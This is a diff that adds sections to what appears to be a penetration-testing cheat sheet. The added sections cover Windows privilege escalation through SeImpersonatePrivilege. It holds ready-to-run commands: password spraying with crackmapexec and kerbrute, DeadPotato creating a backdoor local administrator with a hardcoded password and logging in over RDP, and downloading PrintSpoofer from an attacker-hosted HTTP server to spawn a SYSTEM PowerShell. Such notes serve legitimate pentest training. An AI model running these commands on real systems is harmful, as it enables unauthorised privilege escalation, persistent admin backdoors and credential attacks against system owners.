@@ -1890,6 +1890,27 @@ crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on
 # Kerbrute
 kerbrute passwordspray -d corp.com .\usernames.txt "pass"
 ```
+### DeadPotato SeImpersonatePrivilege
+- For SeImpersonatePrivilege try PrintSpoofer, Different Potatos
+- In Powershell or cmd
+
+```powershell
+.\DeadPotato.exe -newadmin ashok:Ashok@123
+net localgroup administrators # Created User
+xfreerdp /u:ashok /p:Ashok@123 /v:IP /smart-sizing:1920x1080 /cert-ignore
+or 
+# Create a PSCredential object with the username and password
+$securePassword = ConvertTo-SecureString "Ashok@123" -AsPlainText -Force
+$credential = New-Object System.Management.Automation.PSCredential("domain\ashok", $securePassword)
+# Use Start-Process to run a command with the specified credentials
+Start-Process "cmd.exe" -Credential $credential
+```
+#### PrintSpoofer SeImpersonatePrivilege
+- In PrintSpoofer powershell
+```powershell
+iwr -uri http://IP:8000/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
+.\PrintSpoofer64.exe -i -c powershell.exe
+```
 
 ### AS-REP Roasting
 
